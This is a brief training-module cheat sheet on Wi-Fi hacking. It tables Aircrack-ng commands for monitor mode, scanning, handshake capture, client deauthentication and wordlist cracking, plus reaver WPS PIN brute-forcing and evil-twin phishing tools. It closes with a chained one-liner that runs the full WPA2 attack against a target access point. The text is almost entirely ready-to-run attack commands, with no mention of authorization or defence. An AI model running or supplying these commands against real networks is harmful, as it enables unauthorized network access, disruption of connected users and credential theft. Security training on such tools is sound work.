# Module 16: Wireless Hacking Commands

### 1. The Aircrack-ng Suite
Aircrack-ng is the primary toolkit for Wi-Fi hacking.

| Command | Description | Usage |
| :--- | :--- | :--- |
| `airmon-ng start wlan0` | Enable Monitor Mode | Turn your card into a "sniffer". |
| `airodump-ng wlan0mon` | Scan for nearby APs | Find target SSID and BSSID (MAC). |
| `airodump-ng -c <chan> --bssid <mac> -w <file> wlan0mon` | Capture the handshake | Listen to one specific AP. |
| `aireplay-ng -0 10 -a <bssid> -c <client> wlan0mon` | Deauthenticate a client | Force a reconnection. |
| `aircrack-ng -w <list> <cap_file>` | Crack the handshake | Brute-force the captured hash. |

### 2. WPS Attacks
- **Wash**: `wash -i wlan0mon` (Find APs with WPS enabled).
- **Reaver**: `reaver -i wlan0mon -b <bssid> -vv` (Brute-force the WPS PIN).

### 3. Evil Twin Tooling
- **Wifiphisher**: An automated tool that creates fake APs and phishing pages.
- **Airgeddon**: A massive script that combines all wireless tools into one menu.

### The "WPA2 Crack Chain":
Monitor Mode $\rightarrow$ Scan $\rightarrow$ Target AP $\rightarrow$ Deauth Client $\rightarrow$ Capture Handshake $\rightarrow$ Crack offline:
```bash
airmon-ng start wlan0 && airodump-ng wlan0mon && airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon && aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon && aircrack-ng -w rockyou.txt capture-01.cap
```
